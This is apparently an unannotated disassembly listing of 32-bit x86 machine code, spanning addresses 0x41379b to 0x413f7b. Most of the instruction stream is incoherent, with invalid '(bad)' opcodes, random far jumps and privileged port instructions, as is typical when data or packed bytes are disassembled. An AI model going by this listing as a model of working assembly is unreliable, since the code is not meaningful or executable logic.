  41379b:	test   BYTE PTR [edx-0x5ad32dca],bh
  4137a1:	lea    edi,[ecx]
  4137a3:	leave  
  4137a4:	out    0xf6,eax
  4137a6:	push   es
  4137a7:	das    
  4137a8:	dec    ecx
  4137a9:	xor    ecx,DWORD PTR cs:[edx]
  4137ac:	pop    ebp
  4137ad:	(bad)  
  4137ae:	pop    ecx
  4137af:	xchg   DWORD PTR [esi-0x18503c17],ecx
  4137b5:	push   ebx
  4137b6:	arpl   WORD PTR [edi+0x2823ce02],cx
  4137bc:	js     0x4137c0
  4137be:	mov    ch,dh
  4137c0:	push   eax
  4137c1:	pop    esp
  4137c2:	fcomp  DWORD PTR [ecx+edx*4-0x39]
  4137c6:	pop    esi
  4137c7:	sub    BYTE PTR [edx-0x58844f73],0xba
  4137ce:	enter  0x66fd,0x10
  4137d2:	mov    dl,0x4f
  4137d4:	sub    DWORD PTR [eax],ebx
  4137d6:	jae    0x4137ad
  4137d8:	jge    0x41376a
  4137da:	mov    ebx,0x58edf9f6
  4137df:	xchg   ebp,eax
  4137e0:	movd   mm5,DWORD PTR [ecx]
  4137e3:	daa    
  4137e4:	clc    
  4137e5:	xchg   DWORD PTR [ecx+0x11dcb47b],ebp
  4137eb:	fs pop si
  4137ee:	fiadd  WORD PTR [esi-0x4c]
  4137f1:	lds    eax,FWORD PTR [esi+esi*4]
  4137f4:	cmp    eax,0xd117dd78
  4137f9:	daa    
  4137fa:	jmp    0xf708b233
  4137ff:	mov    al,ds:0x163b764d
  413804:	and    eax,edi
  413806:	adc    al,0xa3
  413808:	adc    BYTE PTR [edx],ch
  41380a:	ret    
  41380b:	stc    
  41380c:	jle    0x4137e6
  41380e:	pminub mm3,QWORD PTR [ebp-0x38ac7e66]
  413815:	lock lods al,BYTE PTR ds:[esi]
  413817:	mov    dl,0x6c
  413819:	mov    al,0x5e
  41381b:	ss mov edi,0x47ae5e31
  413821:	jle    0x413827
  413823:	mov    eax,ds:0xe883a0c6
  413828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413829:	mov    al,ds:0x9d93b9f1
  41382e:	cmp    BYTE PTR [ecx+0x59d47442],cl
  413834:	push   edi
  413835:	or     ah,ch
  413837:	in     al,dx
  413838:	or     BYTE PTR [edx],cl
  41383a:	dec    ebx
  41383b:	xor    esp,esi
  41383d:	pop    ds
  41383e:	inc    ebp
  41383f:	mov    ds:0xab7da2e1,eax
  413844:	mov    dl,0xdb
  413846:	fidivr DWORD PTR [edx]
  413848:	mov    es,WORD PTR [ebp+0x28]
  41384b:	mov    esp,0xd2931e0f
  413850:	je     0x413806
  413852:	out    dx,al
  413853:	add    eax,0xf14e8283
  413858:	cmp    BYTE PTR [ebx+edx*8+0x11],dl
  41385c:	sbb    eax,DWORD PTR [edi+0x45]
  41385f:	mov    edi,0x894c2732
  413864:	xchg   ecx,eax
  413865:	mov    al,ds:0xf383331d
  41386a:	mov    WORD PTR [edi+0x78],?
  41386d:	sti    
  41386e:	xor    DWORD PTR [ebx-0x1f],esi
  413871:	cmp    eax,ecx
  413873:	pop    edx
  413874:	mov    ecx,0xf51ee950
  413879:	rcr    DWORD PTR [esi-0x80],0x62
  41387d:	jecxz  0x413807
  41387f:	xor    bh,BYTE PTR [edi]
  413881:	push   edi
  413882:	retf   
  413883:	xor    al,0x4b
  413885:	push   0xc4e3cf1d
  41388a:	int3   
  41388b:	cwde   
  41388c:	mov    eax,ds:0xd2863b62
  413891:	test   esp,edi
  413893:	test   al,0xce
  413895:	repnz and DWORD PTR [edx+ebp*1-0x17],eax
  41389a:	and    bh,BYTE PTR [eax+0x51]
  41389d:	jno    0x4138ba
  41389f:	loopne 0x413832
  4138a1:	push   0x3
  4138a3:	hlt    
  4138a4:	xchg   esi,eax
  4138a5:	ins    BYTE PTR es:[edi],dx
  4138a6:	or     bl,BYTE PTR [eax+0x800b12c]
  4138ac:	test   eax,0x10ec5a3d
  4138b1:	loop   0x4138bd
  4138b3:	bound  ebx,QWORD PTR [ebx]
  4138b5:	mov    dl,0x69
  4138b7:	mov    al,0xf2
  4138b9:	mov    eax,ds:0x4cefc9b1
  4138be:	js     0x4138f3
  4138c0:	retf   
  4138c1:	repz xlat BYTE PTR ds:[ebx]
  4138c3:	sbb    BYTE PTR [edx+edi*1-0x1812610a],ch
  4138ca:	adc    edi,eax
  4138cc:	fstp   DWORD PTR [ecx+edi*1-0x5444c2ef]
  4138d3:	inc    eax
  4138d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d5:	jge    0x413919
  4138d7:	inc    ebx
  4138d8:	icebp  
  4138d9:	jnp    0x41388f
  4138db:	mov    DWORD PTR [eax*1-0x2cb43b65],ebx
  4138e2:	inc    esp
  4138e3:	pop    ebp
  4138e4:	sbb    al,0xb
  4138e6:	sahf   
  4138e7:	xor    al,0xde
  4138e9:	jp     0x413919
  4138eb:	pop    ebp
  4138ec:	and    BYTE PTR [eax-0x1a0e0607],cl
  4138f2:	mov    ecx,0x57eb2637
  4138f7:	jbe    0x4138f9
  4138f9:	pop    edx
  4138fa:	std    
  4138fb:	lea    edx,[ebp+0x4a]
  4138fe:	data16 loop 0x41396d
  413901:	loopne 0x4138ae
  413903:	sbb    dl,BYTE PTR [ebx+0x4153c084]
  413909:	xlat   BYTE PTR gs:[ebx]
  41390b:	push   ss
  41390c:	ficomp DWORD PTR [esi-0x196a9b1f]
  413912:	call   0x82f6:0x496a4479
  413919:	xor    DWORD PTR [edi-0x216f7096],edi
  41391f:	js     0x41390e
  413921:	adc    al,0x5
  413923:	pop    ecx
  413924:	mov    al,0xd4
  413926:	je     0x413975
  413928:	ficom  DWORD PTR [edx]
  41392a:	repnz add ch,ah
  41392d:	mov    BYTE PTR [edi+edx*2-0x128c4a64],0x35
  413935:	add    eax,0xb58a4ac
  41393a:	test   DWORD PTR [ebx],ecx
  41393c:	jmp    0x37a0:0xff02f7c6
  413943:	sub    al,0xc3
  413945:	xor    eax,0x6c50a070
  41394a:	std    
  41394b:	jle    0x413978
  41394d:	cmp    cl,dh
  41394f:	pop    ss
  413950:	jns    0x413946
  413952:	les    edi,FWORD PTR [edi+0x3f]
  413955:	mov    ah,0xb1
  413957:	cmp    al,0x8d
  413959:	lds    edi,FWORD PTR [esi-0x77]
  41395c:	add    BYTE PTR [eax-0x48aafcbe],dl
  413962:	aam    0x53
  413964:	xchg   ebx,eax
  413965:	popf   
  413966:	cmp    al,0x36
  413968:	retf   0x89eb
  41396b:	jl     0x41392d
  41396d:	cmp    DWORD PTR ds:0x5ceffda4,ebp
  413973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413974:	test   eax,0x843f8d57
  413979:	imul   edx,ebx,0x825e0d71
  41397f:	pop    eax
  413980:	jge    0x4139a0
  413982:	je     0x4139a9
  413984:	scas   al,BYTE PTR es:[edi]
  413985:	cwde   
  413986:	das    
  413987:	or     BYTE PTR [ebx],bh
  413989:	add    ebx,edx
  41398b:	loope  0x41396b
  41398d:	lods   al,BYTE PTR ds:[esi]
  41398e:	push   0x2406f72e
  413993:	jne    0x413953
  413995:	mov    esi,eax
  413997:	dec    ebx
  413998:	arpl   WORD PTR [eax-0x3b9179d8],sp
  41399e:	(bad)  
  41399f:	out    dx,eax
  4139a0:	pop    ebp
  4139a1:	call   0x3457:0xfb73d315
  4139a8:	jmp    0x413962
  4139aa:	retf   0xc299
  4139ad:	retf   
  4139ae:	pop    ds
  4139af:	test   DWORD PTR [ebp-0xa],eax
  4139b2:	push   0x15
  4139b4:	mov    bl,0x38
  4139b6:	bound  ebx,QWORD PTR [ebp+0x32845d49]
  4139bc:	imul   esp,DWORD PTR [eax-0x6f],0xffffff93
  4139c0:	jae    0x4139cc
  4139c2:	call   0x3d88:0x3d45194c
  4139c9:	jno    0x41399e
  4139cb:	jnp    0x4139f2
  4139cd:	xchg   esp,eax
  4139ce:	mul    edi
  4139d0:	jne    0x41399f
  4139d2:	stos   BYTE PTR es:[edi],al
  4139d3:	jbe    0x413a24
  4139d5:	ror    ebp,cl
  4139d7:	and    al,0x79
  4139d9:	mov    al,0x53
  4139db:	xor    BYTE PTR [ebx],0xe0
  4139de:	inc    ecx
  4139df:	dec    edi
  4139e0:	dec    ecx
  4139e1:	in     al,dx
  4139e2:	mov    al,0x2b
  4139e4:	shl    BYTE PTR [ebx+0x1e],1
  4139e7:	mov    ch,0xa7
  4139e9:	cmp    DWORD PTR [ebx+0x22],0x2ca4b748
  4139f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f1:	push   edx
  4139f2:	xchg   ebx,eax
  4139f3:	add    DWORD PTR [esi+0xe],edx
  4139f6:	mov    dh,0x96
  4139f8:	sbb    DWORD PTR fs:[edi-0x7c],ebp
  4139fc:	cld    
  4139fd:	push   es
  4139fe:	mov    WORD PTR [ecx+edx*4],cs
  413a01:	addr16 addr16 jns 0x413a39
  413a05:	imul   DWORD PTR [ebp-0x20]
  413a08:	mov    cl,0x78
  413a0a:	pop    edi
  413a0b:	xchg   edx,eax
  413a0c:	push   ds
  413a0d:	mov    dl,BYTE PTR [ebx-0x31]
  413a10:	pop    ds
  413a11:	jns    0x4139e3
  413a13:	hlt    
  413a14:	in     al,0xed
  413a16:	xlat   BYTE PTR ds:[ebx]
  413a17:	mov    ds:0xfa477318,al
  413a1c:	mov    bh,BYTE PTR [edx]
  413a1e:	jl     0x4139b8
  413a20:	sbb    eax,esi
  413a22:	mov    ecx,0x362ca34f
  413a27:	xlat   BYTE PTR ds:[ebx]
  413a28:	das    
  413a29:	jmp    0xe1f95538
  413a2e:	pop    edx
  413a2f:	pop    ds
  413a30:	mov    ecx,DWORD PTR [ebx]
  413a32:	mov    eax,0x56225a17
  413a37:	ins    BYTE PTR es:[edi],dx
  413a38:	jnp    0x413a6b
  413a3a:	sub    ah,bh
  413a3c:	mov    di,?
  413a3f:	es jbe 0x413a1f
  413a42:	cmp    BYTE PTR [ebx+0x59300b85],dh
  413a48:	call   0x46499957
  413a4d:	retf   0x7ba6
  413a50:	xchg   edx,eax
  413a51:	and    BYTE PTR [edx+0x36],ah
  413a54:	call   DWORD PTR [ecx]
  413a56:	or     eax,DWORD PTR [edx+0x396ec59f]
  413a5c:	push   eax
  413a5d:	test   eax,0x9503aa85
  413a62:	loope  0x413ad7
  413a64:	pop    ebx
  413a65:	pop    edx
  413a66:	pop    ebp
  413a67:	aas    
  413a68:	jne    0x413a8d
  413a6a:	jmp    0x413a78
  413a6c:	jb     0x413ae2
  413a6e:	mov    edx,0x174a30ef
  413a73:	dec    esi
  413a74:	adc    dh,ch
  413a76:	pop    esp
  413a77:	retf   
  413a78:	mov    esi,0x24d1bf1e
  413a7d:	mov    esp,0x45de4a7
  413a82:	cmp    eax,0x5028d9a8
  413a87:	jae    0x413adb
  413a89:	fst    QWORD PTR [edi*4-0x6249f329]
  413a90:	test   al,0x4
  413a92:	leave  
  413a93:	jne    0x413af3
  413a95:	(bad)  
  413a96:	pusha  
  413a97:	xchg   BYTE PTR [edx+0x41],ch
  413a9a:	mov    ch,0x52
  413a9c:	arpl   bx,di
  413a9e:	sub    ch,bl
  413aa0:	out    dx,eax
  413aa1:	repz int3 
  413aa3:	xchg   ebp,eax
  413aa4:	sbb    bl,BYTE PTR [edi+0x3c132dc8]
  413aaa:	sti    
  413aab:	xlat   BYTE PTR ds:[ebx]
  413aac:	push   esi
  413aad:	sub    ebp,DWORD PTR [ebx+0x31]
  413ab0:	shr    esi,0xe0
  413ab3:	push   ebx
  413ab4:	xchg   esp,eax
  413ab5:	sbb    BYTE PTR [edx-0x12],dh
  413ab8:	lods   al,BYTE PTR ds:[esi]
  413ab9:	mov    ah,0x91
  413abb:	dec    esp
  413abc:	mov    dh,BYTE PTR [ebx+0x3e]
  413abf:	or     al,0xa
  413ac1:	mov    ah,0x77
  413ac3:	cmc    
  413ac4:	test   DWORD PTR [ebx-0x25],edx
  413ac7:	mov    al,ds:0xeed5b275
  413acc:	jo     0x413a65
  413ace:	popf   
  413acf:	pop    ebp
  413ad0:	or     BYTE PTR [esi+ebx*1+0x5ab5b47d],bh
  413ad7:	xor    esi,DWORD PTR [esi+ecx*4-0x30e9040d]
  413ade:	ret    0xb21e
  413ae1:	sbb    DWORD PTR [esi*1-0x690a7a6c],ebp
  413ae8:	aad    0x6e
  413aea:	pop    edi
  413aeb:	jl     0x413b0e
  413aed:	add    DWORD PTR [eax+0x7e],eax
  413af0:	fsubr  QWORD PTR [edx-0x56]
  413af3:	push   ecx
  413af4:	ror    BYTE PTR [ebp+0x54aba3f6],0x48
  413afb:	std    
  413afc:	jmp    0xfbe7a7af
  413b01:	xchg   esp,eax
  413b02:	and    BYTE PTR [edi-0x198428ad],al
  413b08:	push   0x8087598c
  413b0d:	or     ax,0xa15
  413b11:	div    DWORD PTR [edx]
  413b13:	rol    esp,cl
  413b15:	cmp    ebp,DWORD PTR [ecx-0x540c01bf]
  413b1b:	into   
  413b1c:	shr    DWORD PTR [ebx-0x2ab1af39],0xa8
  413b23:	adc    BYTE PTR [ecx-0x4a],0x4c
  413b27:	and    DWORD PTR [eax-0x71],edi
  413b2a:	mov    edi,0x5003893f
  413b2f:	pop    esi
  413b30:	(bad)  
  413b31:	in     eax,0x55
  413b33:	mov    bl,0x47
  413b35:	pop    esp
  413b36:	jbe    0x413aed
  413b38:	rol    DWORD PTR [edi+0x4b748eae],cl
  413b3e:	xor    BYTE PTR [ecx],0x6d
  413b41:	int    0x60
  413b43:	mov    ecx,0xf772fb2d
  413b48:	adc    ebp,ebx
  413b4a:	cmp    eax,0x97610ed3
  413b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b50:	out    0xc1,eax
  413b52:	addr16 pusha 
  413b54:	outs   dx,DWORD PTR ds:[esi]
  413b55:	mov    dl,0x99
  413b57:	sar    BYTE PTR [esi+0x5ab6f335],0x5d
  413b5e:	call   0x1b305bbc
  413b63:	mov    BYTE PTR fs:[ebx],bh
  413b66:	sti    
  413b67:	adc    al,0xbd
  413b69:	icebp  
  413b6a:	or     edx,ebp
  413b6c:	adc    BYTE PTR gs:[eax],dh
  413b6f:	fld    DWORD PTR [esi+0x6c1a2a5c]
  413b75:	lock add DWORD PTR [edx],ebp
  413b78:	iret   
  413b79:	retf   
  413b7a:	push   ebp
  413b7b:	(bad)  
  413b7c:	shl    DWORD PTR [edx+eiz*1],cl
  413b7f:	das    
  413b80:	adc    edx,edi
  413b82:	outs   dx,DWORD PTR ds:[esi]
  413b83:	mov    ebp,DWORD PTR [ebx+0x77]
  413b86:	cmc    
  413b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b88:	in     eax,dx
  413b89:	push   es
  413b8a:	fcomi  st,st(2)
  413b8c:	test   ecx,0xc1cd7fe5
  413b92:	pusha  
  413b93:	ins    DWORD PTR es:[edi],dx
  413b94:	jae    0x413bb5
  413b96:	sub    al,0xdc
  413b98:	out    0xe0,al
  413b9a:	in     al,0xc9
  413b9c:	lahf   
  413b9d:	fidivr DWORD PTR [edx-0xf]
  413ba0:	lods   al,BYTE PTR ds:[esi]
  413ba1:	push   ecx
  413ba2:	mov    ds:0xf3cf6c95,eax
  413ba7:	mov    bl,0x18
  413ba9:	jb     0x413ba7
  413bab:	push   edx
  413bac:	jae    0x413b75
  413bae:	mov    esp,db2
  413bb1:	cmp    eax,0x16e88e22
  413bb6:	and    DWORD PTR [ebp-0x54],ebp
  413bb9:	mov    dh,0xd1
  413bbb:	outs   dx,DWORD PTR ds:[esi]
  413bbc:	aas    
  413bbd:	nop
  413bbe:	(bad)  
  413bbf:	int    0x54
  413bc1:	sbb    bx,WORD PTR [edx-0x3a]
  413bc5:	cld    
  413bc6:	(bad)  
  413bc7:	retf   0xa308
  413bca:	pushw  0xa83b
  413bce:	jbe    0x413c1c
  413bd0:	adc    eax,0xfd2c909f
  413bd5:	inc    eax
  413bd6:	stc    
  413bd7:	sbb    ecx,DWORD PTR [edx]
  413bd9:	inc    ebx
  413bda:	sbb    eax,0x93526fb0
  413bdf:	ret    0x4ca9
  413be2:	cmp    DWORD PTR [edx-0x7f],0x1c
  413be6:	in     eax,0x2d
  413be8:	xor    eax,0xba22fa19
  413bed:	popf   
  413bee:	jmp    0xfa1b:0xff881650
  413bf5:	xchg   ebx,eax
  413bf6:	sub    DWORD PTR [eax+eiz*1+0x6f42823],0xffa148c2
  413c01:	inc    edi
  413c02:	daa    
  413c03:	cdq    
  413c04:	cmp    esi,ebp
  413c06:	fnstenv [ecx+0x3cea9509]
  413c0c:	pop    esp
  413c0d:	cwde   
  413c0e:	sbb    BYTE PTR [ebx],cl
  413c10:	shl    DWORD PTR [eax],0xe1
  413c13:	mov    bh,0xde
  413c15:	aaa    
  413c16:	sahf   
  413c17:	push   esp
  413c18:	aam    0x88
  413c1a:	bound  eax,QWORD PTR [edi+0x54]
  413c1d:	in     al,0x36
  413c1f:	jbe    0x413be2
  413c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c22:	call   0x3a2b3bd5
  413c27:	and    dl,BYTE PTR ds:0xc793716
  413c2d:	pusha  
  413c2e:	shl    ebx,cl
  413c30:	(bad)  
  413c31:	retf   0x342f
  413c34:	mov    bh,BYTE PTR [edx+0x488a628d]
  413c3a:	shr    DWORD PTR [ebp-0x23cfad1d],1
  413c40:	inc    ecx
  413c41:	cld    
  413c42:	inc    DWORD PTR [edx-0x45]
  413c45:	bound  eax,QWORD PTR [ebx+0x83e3392]
  413c4b:	daa    
  413c4c:	inc    ebp
  413c4d:	out    0x8b,al
  413c4f:	repz test BYTE PTR [esi-0x41c03387],bl
  413c56:	fsub   st(1),st
  413c58:	leave  
  413c59:	loop   0x413c79
  413c5b:	fld    DWORD PTR [ebp+0x59c99b3a]
  413c61:	adc    ax,0x3dfc
  413c65:	adc    eax,0x2aaad4fa
  413c6a:	pushf  
  413c6b:	test   al,0x2a
  413c6d:	std    
  413c6e:	xchg   BYTE PTR [edx+0x67],ch
  413c71:	loopne 0x413c32
  413c73:	add    ecx,esp
  413c75:	inc    ecx
  413c76:	cmp    cl,ch
  413c78:	scas   al,BYTE PTR es:[edi]
  413c79:	jns    0x413ca1
  413c7b:	hlt    
  413c7c:	gs (bad) 
  413c7f:	mov    DWORD PTR ds:0x2d7ab6e1,ecx
  413c85:	xchg   BYTE PTR [ebx+0x941c95e],dh
  413c8b:	xchg   BYTE PTR [ecx-0x66],cl
  413c8e:	jg     0x413c4b
  413c90:	mov    edx,0x27699581
  413c95:	mov    dh,0xc
  413c97:	mov    bl,0x94
  413c99:	lods   eax,DWORD PTR ds:[esi]
  413c9a:	xchg   ebp,eax
  413c9b:	xor    al,0x7f
  413c9d:	fst    QWORD PTR ds:0x2878e5fa
  413ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ca4:	push   ebx
  413ca5:	out    dx,al
  413ca6:	mov    eax,0x92df4060
  413cab:	scas   al,BYTE PTR es:[edi]
  413cac:	xchg   esp,eax
  413cad:	sbb    BYTE PTR [ebx+0x2a],0xc
  413cb1:	mov    esi,0xa3d243f4
  413cb6:	ret    
  413cb7:	(bad)  
  413cb8:	shl    DWORD PTR [edi-0x5f],cl
  413cbb:	mov    eax,ds:0x5b6de924
  413cc0:	mov    dl,0x85
  413cc2:	aaa    
  413cc3:	sbb    al,0x9b
  413cc5:	mov    ds:0xda6164f9,eax
  413cca:	dec    eax
  413ccb:	push   ebx
  413ccc:	or     al,0x45
  413cce:	cmp    ch,BYTE PTR [ecx+eax*8+0x2f]
  413cd2:	in     al,dx
  413cd3:	cli    
  413cd4:	mov    edi,DWORD PTR [ecx]
  413cd6:	nop
  413cd7:	pop    eax
  413cd8:	sbb    bh,BYTE PTR [esi]
  413cda:	dec    esi
  413cdb:	inc    edx
  413cdc:	dec    eax
  413cdd:	xor    ebx,DWORD PTR [eax-0x26]
  413ce0:	outs   dx,BYTE PTR ds:[esi]
  413ce1:	sub    ah,BYTE PTR [ebx-0x42]
  413ce4:	sti    
  413ce5:	(bad)  
  413ce8:	in     eax,0x43
  413cea:	sub    BYTE PTR es:[edx+0x1a],bh
  413cee:	mov    ?,WORD PTR [eax-0x5f]
  413cf1:	jbe    0x413cc1
  413cf3:	mov    ecx,0x8b7e0a09
  413cf8:	pop    esi
  413cf9:	adc    eax,DWORD PTR [esi+0x36]
  413cfc:	mov    bl,0x96
  413cfe:	mov    bh,0x86
  413d00:	mov    bl,0xc1
  413d02:	scas   eax,DWORD PTR es:[edi]
  413d03:	in     al,dx
  413d04:	pop    esi
  413d05:	or     DWORD PTR [eax+esi*1+0xedeea92],ebp
  413d0c:	(bad)  
  413d0d:	jmp    0x435d:0x5a5aec7c
  413d14:	in     eax,dx
  413d15:	std    
  413d16:	pop    es
  413d17:	cmc    
  413d18:	cmp    eax,0x238b07c1
  413d1d:	mov    edi,0x2ea275d0
  413d22:	jmp    0x48b:0x9535b516
  413d29:	dec    eax
  413d2a:	or     DWORD PTR [ebx],ecx
  413d2c:	cld    
  413d2d:	cld    
  413d2e:	dec    ecx
  413d2f:	adc    eax,0xed0b5719
  413d34:	pop    ebp
  413d35:	cs inc ebp
  413d37:	mov    dh,0xc9
  413d39:	pop    ss
  413d3a:	(bad)  
  413d3b:	in     eax,dx
  413d3c:	aas    
  413d3d:	into   
  413d3e:	inc    esi
  413d3f:	dec    edx
  413d40:	cmp    eax,0x7acc30dc
  413d45:	push   0x5
  413d47:	xchg   edi,eax
  413d48:	mov    ecx,fs
  413d4a:	hlt    
  413d4b:	inc    eax
  413d4c:	sbb    BYTE PTR [edx-0x74],bh
  413d4f:	jns    0x413da2
  413d51:	daa    
  413d52:	and    dl,0x75
  413d55:	push   edi
  413d56:	test   BYTE PTR [eax+0x269caa31],bl
  413d5c:	xor    ebp,DWORD PTR [edi-0x9]
  413d5f:	cmp    eax,DWORD PTR [ecx+0x4c]
  413d62:	mov    al,ds:0xf43111a1
  413d67:	inc    ecx
  413d68:	xor    bh,BYTE PTR [edi-0x2b2f22bc]
  413d6e:	lea    esi,[edi+0x4dbc851a]
  413d74:	jmp    0xe0c0f5b2
  413d79:	or     eax,DWORD PTR [esi]
  413d7b:	shl    BYTE PTR [eax],0xd2
  413d7e:	dec    ebp
  413d7f:	jbe    0x413d51
  413d81:	call   0x9d9a:0x9a47df14
  413d88:	cmp    eax,0xa4c1fc32
  413d8d:	addr16 mov esp,0x11edfa15
  413d93:	mov    ?,WORD PTR [ebx]
  413d95:	ja     0x413d1d
  413d97:	into   
  413d98:	cmp    ah,BYTE PTR [eax-0x75]
  413d9b:	jle    0x413d83
  413d9d:	cdq    
  413d9e:	mov    al,ds:0x2eadda7d
  413da3:	jl     0x413d47
  413da5:	or     BYTE PTR [ebp+0x7e5fdce0],bl
  413dab:	rcr    DWORD PTR [ecx],0x7f
  413dae:	dec    eax
  413daf:	aam    0xf8
  413db1:	iret   
  413db2:	fisubr WORD PTR [ebx+edi*4-0x404141c3]
  413db9:	dec    esp
  413dba:	jb     0x413dbb
  413dbc:	call   0x7c29:0xacd4482b
  413dc3:	daa    
  413dc4:	arpl   WORD PTR [esi-0x7e7221d8],si
  413dca:	call   0xde85:0xaaa3190e
  413dd1:	pop    ss
  413dd2:	sub    BYTE PTR [edi+0x74],al
  413dd5:	call   0xf541cb6c
  413dda:	lods   eax,DWORD PTR ds:[esi]
  413ddb:	add    bl,BYTE PTR [ebp+0xd]
  413dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ddf:	push   ecx
  413de0:	fadd   QWORD PTR [edx]
  413de2:	fcom   QWORD PTR [ecx]
  413de4:	(bad)  
  413de5:	jnp    0x413d7e
  413de7:	mov    ch,dh
  413de9:	inc    esi
  413dea:	dec    esi
  413deb:	adc    bl,dh
  413ded:	xchg   BYTE PTR [eax+0x463653bc],bh
  413df3:	mov    al,ds:0x9a4444e8
  413df8:	retf   0x6d9b
  413dfb:	xchg   ebp,eax
  413dfc:	loopne 0x413e51
  413dfe:	fnstsw WORD PTR ds:0xc7f75889
  413e04:	push   esp
  413e05:	pusha  
  413e06:	pop    edx
  413e07:	fwait
  413e08:	mov    edi,0xff8776ef
  413e0d:	repz push edi
  413e0f:	popf   
  413e10:	push   edi
  413e11:	mov    ebx,cs
  413e13:	jae    0x413de3
  413e15:	mov    edi,DWORD PTR [edx]
  413e17:	lea    esp,[ebx-0x3e45d2eb]
  413e1d:	add    DWORD PTR [esi-0x3e1a2049],esp
  413e23:	(bad)  [edi]
  413e25:	out    0x91,al
  413e27:	in     eax,0xb3
  413e29:	daa    
  413e2a:	jo     0x413e8c
  413e2c:	or     ebx,DWORD PTR [esi+eiz*2-0x2d630645]
  413e33:	aas    
  413e34:	push   edx
  413e35:	cmp    dh,BYTE PTR [edi-0x6]
  413e38:	pop    edx
  413e39:	clc    
  413e3a:	sub    al,0x1c
  413e3c:	inc    ebx
  413e3d:	fiadd  WORD PTR [esi-0xf]
  413e40:	xor    dl,BYTE PTR [ecx+0x41b13e55]
  413e46:	or     DWORD PTR [ecx+ebx*1-0x5f82fd3e],ebx
  413e4d:	mov    gs,WORD PTR [eax-0x31b87642]
  413e53:	mov    ecx,0xd441c8d2
  413e58:	mov    bl,0x8a
  413e5a:	shr    DWORD PTR [esp+eiz*4],0x4e
  413e5e:	rcl    BYTE PTR [ecx+0x1e],1
  413e61:	sub    edi,edi
  413e63:	daa    
  413e64:	arpl   WORD PTR [esi-0x4d0157b3],si
  413e6a:	jle    0x413e81
  413e6c:	add    eax,0x365f86a5
  413e71:	cmp    BYTE PTR [ecx-0x4],bl
  413e74:	mov    DWORD PTR [esi-0x3e],esp
  413e77:	xchg   edi,eax
  413e78:	sar    DWORD PTR [ebp+0x7fbe435],cl
  413e7e:	in     eax,dx
  413e7f:	outs   dx,BYTE PTR ds:[esi]
  413e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e81:	enter  0x61fe,0xf8
  413e85:	clc    
  413e86:	or     esp,DWORD PTR [ebp-0x15]
  413e89:	mov    edx,0x295ce5aa
  413e8e:	fcomp  QWORD PTR [edi-0x13]
  413e91:	std    
  413e92:	sti    
  413e93:	call   0xe7996683
  413e98:	sbb    al,0xc0
  413e9a:	mov    ecx,0xaac06947
  413e9f:	lods   eax,DWORD PTR fs:[esi]
  413ea1:	jg     0x413e45
  413ea3:	mov    WORD PTR [edx+0x41],?
  413ea6:	mov    bl,0x8c
  413ea8:	jo     0x413ed6
  413eaa:	stc    
  413eab:	loope  0x413e79
  413ead:	arpl   sp,cx
  413eaf:	lods   eax,DWORD PTR ds:[esi]
  413eb0:	sub    al,0x3a
  413eb2:	imul   edx,eax,0xffffffc0
  413eb5:	inc    esp
  413eb6:	jmp    0x413eb1
  413eb8:	mov    DWORD PTR [ebx+0x630b958f],edi
  413ebe:	lods   eax,DWORD PTR ds:[esi]
  413ebf:	sub    eax,0x845dd451
  413ec4:	and    ebp,DWORD PTR [eax*2-0x3a07bbf3]
  413ecb:	sbb    al,0xbf
  413ecd:	fidiv  DWORD PTR [ebp-0x50]
  413ed0:	dec    esp
  413ed1:	fbstp  TBYTE PTR [edx+0x3e]
  413ed4:	hlt    
  413ed5:	dec    esi
  413ed6:	inc    edx
  413ed7:	fwait
  413ed8:	popa   
  413ed9:	repz sub DWORD PTR [ebx],edi
  413edc:	in     eax,0x7e
  413ede:	cmp    al,0xc2
  413ee0:	in     al,0x7
  413ee2:	lds    eax,FWORD PTR [ebp+0x4e]
  413ee5:	shl    DWORD PTR [ebx],cl
  413ee7:	outs   dx,BYTE PTR ds:[esi]
  413ee8:	outs   dx,DWORD PTR ds:[esi]
  413ee9:	in     al,0xac
  413eeb:	sbb    DWORD PTR [edi-0x4b4fe3b1],eax
  413ef1:	(bad)  
  413ef2:	nop
  413ef3:	jge    0x413f3f
  413ef5:	gs jmp 0x413f38
  413ef8:	jae    0x413f11
  413efa:	mov    edx,0x1e0b735b
  413eff:	ds xor ch,0x9a
  413f03:	sahf   
  413f04:	fbld   TBYTE PTR [esi-0x55]
  413f07:	shr    DWORD PTR ds:0xdecb3bad,cl
  413f0d:	inc    ebp
  413f0e:	stos   DWORD PTR es:[edi],eax
  413f0f:	int    0x95
  413f11:	out    0x6f,al
  413f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f14:	and    al,0xbf
  413f16:	jl     0x413eab
  413f18:	enter  0xe24,0xcb
  413f1c:	push   esp
  413f1d:	dec    ebx
  413f1e:	dec    eax
  413f1f:	sahf   
  413f20:	jnp    0x413f3b
  413f22:	push   edx
  413f23:	pop    esp
  413f24:	add    eax,0xc5707b26
  413f29:	ret    0x2bd1
  413f2c:	fcom   DWORD PTR [ecx+edx*2-0x2364af9e]
  413f33:	or     bh,cl
  413f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f36:	out    dx,eax
  413f37:	popf   
  413f38:	lock xchg edi,eax
  413f3a:	inc    ebp
  413f3b:	leave  
  413f3c:	imul   eax,DWORD PTR [eax-0xdb92037],0x76281b98
  413f46:	es scas eax,DWORD PTR es:[edi]
  413f48:	mov    ds:0x18f5e8e7,eax
  413f4d:	xchg   ebp,eax
  413f4e:	cwde   
  413f4f:	ins    DWORD PTR es:[edi],dx
  413f50:	xor    BYTE PTR [ebx+ebp*8+0x6],0x90
  413f55:	jne    0x413f03
  413f57:	out    dx,eax
  413f58:	jmp    0xbec:0x161db47a
  413f5f:	jmp    0xca2ce7b4
  413f64:	mov    DWORD PTR [ecx-0x5d9c9ed3],ebp
  413f6a:	mov    eax,ds:0x12d16f95
  413f6f:	call   0x6aae9364
  413f74:	out    0x34,eax
  413f76:	add    eax,0x25cde089
  413f7b:	inc    eax
